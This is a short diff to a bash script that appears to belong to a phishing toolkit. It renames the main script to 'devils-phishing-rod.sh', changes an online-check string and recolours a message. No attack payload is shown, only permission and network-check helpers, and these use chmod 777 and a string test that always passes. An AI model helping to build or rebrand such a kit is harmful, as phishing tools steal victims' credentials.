@@ -154,10 +154,10 @@ kill_pid() {
 
 #check whether execute permission is granted
 xpermission(){
-if [ -x "lphisher.sh" ];then
+if [ -x "devils-phishing-rod.sh" ];then
 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
 else
-        chmod 777 lphisher.sh
+        chmod 777 devils-phishing-rod.sh
         echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
 fi
 }
@@ -165,10 +165,10 @@ fi
 #Internet check for update
 check_net_update(){
 	check_netstats
-	if [ $netstats=="Working" ]; then
+	if [ $netstats=="Online" ]; then
 		check_update
 	else
-		echo "${GRAY}Your offline, Check your internet and try again."
+		echo "${BLUE}Your offline, Check your internet and try again."
 		sleep 5
 		mainmenu
 	fi
